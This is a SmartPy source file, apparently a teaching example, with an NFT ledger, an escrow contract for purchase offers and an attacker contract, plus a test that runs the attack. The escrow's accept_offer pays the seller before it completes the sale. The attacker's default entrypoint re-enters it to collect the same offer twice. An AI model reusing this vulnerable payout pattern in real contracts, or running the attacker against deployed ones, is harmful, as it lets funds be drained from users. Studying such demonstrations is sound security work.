import smartpy as sp
@sp.module
def main():

    param_type:type = sp.record(token_id = sp.int, new_owner = sp.address)

    class Ledger(sp.Contract):
        
        def __init__(self, admin):
            self.data.admin = admin
            self.data.tokens = sp.big_map()
            self.data.next_token_id = 1

        @sp.entrypoint
        def mint(self, metadata):
            sp.cast(metadata, sp.string)
            self.data.tokens[self.data.next_token_id] = sp.record(owner = sp.sender, metadata = metadata)
            self.data.next_token_id += 1

        @sp.onchain_view()
        def get_token_owner(self, token_id):
            sp.cast(token_id, sp.int)
            return self.data.tokens[token_id].owner

        @sp.entrypoint
        def change_owner(self, token_id, new_owner):
            assert sp.sender == self.data.admin
            self.data.tokens[token_id].owner = new_owner

    class Purchaser(sp.Contract):
        def __init__(self, admin):
            self.data.admin = admin
            self.data.ledger = admin
            self.data.offers = sp.big_map()
            self.data.escrow = sp.big_map()
            self.data.nb_offers = 1

        @sp.entrypoint
        def set_ledger(self, ledger):
            assert sp.sender == self.data.admin
            self.data.ledger = ledger

        @sp.entrypoint
        def add_offer(self, token_id):
            self.data.offers[self.data.nb_offers] = sp.record(token_id = token_id,
                                                              buyer = sp.sender,
                                                              price = sp.amount)
            self.data.nb_offers += 1
            if not self.data.escrow.contains(sp.sender):
                self.data.escrow[sp.sender] = sp.tez(0)
            self.data.escrow[sp.sender] += sp.amount

        @sp.entrypoint
        def accept_offer(self, offer_id):
            sp.cast(offer_id, sp.int)
            offer = self.data.offers[offer_id]
            owner = sp.view("get_token_owner", self.data.ledger, offer.token_id, sp.address).unwrap_some()            
            assert sp.sender == owner
            sp.send(owner, offer.price)
            self.data.escrow[offer.buyer] -= offer.price
            ledger_contract = sp.contract(param_type, self.data.ledger, entrypoint = "change_owner").unwrap_some()
            sp.transfer(sp.record(token_id = offer.token_id, new_owner = offer.buyer), sp.tez(0), ledger_contract)

    class Attacker(sp.Contract):

        def __init__(self, purchaser):
            self.data.purchaser = purchaser
            self.data.nbCalls = 0
            self.data.offer_id = 0
            self.data.price = sp.tez(0)

        @sp.entrypoint
        def attack(self, offer_id):
            self.data.nbCalls = 2
            self.data.offer_id = offer_id
            purchaser_contract = sp.contract(sp.int, self.data.purchaser, entrypoint="accept_offer").unwrap_some()
            sp.transfer(offer_id, sp.tez(0) , purchaser_contract)

        @sp.entrypoint
        def default(self):
            self.data.nbCalls -= 1
            if self.data.nbCalls > 0:
                purchaser_contract = sp.contract(sp.int, self.data.purchaser, entrypoint="accept_offer").unwrap_some()
                sp.transfer(self.data.offer_id, sp.tez(0), purchaser_contract)
                
            
# Tests
@sp.add_test()
def test():
    scenario = sp.test_scenario("Test", main)
    alice = sp.test_account("alice").address
    bob = sp.test_account("Bob").address
    purchaser = main.Purchaser(alice)
    scenario += purchaser
    ledger = main.Ledger(purchaser.address)
    scenario += ledger
    attacker = main.Attacker(purchaser.address)
    scenario += attacker

    purchaser.set_ledger(ledger.address, _sender = alice)

    ledger.mint("my NFT", _sender = attacker.address)
    a = ledger.get_token_owner(1)
    scenario.verify(a == attacker.address)

    purchaser.add_offer(1, _sender = alice, _amount = sp.tez(100))
    purchaser.add_offer(2, _sender = alice, _amount = sp.tez(100))
    #purchaser.accept_offer(1, _sender = attacker.address)
 
    attacker.attack(1)
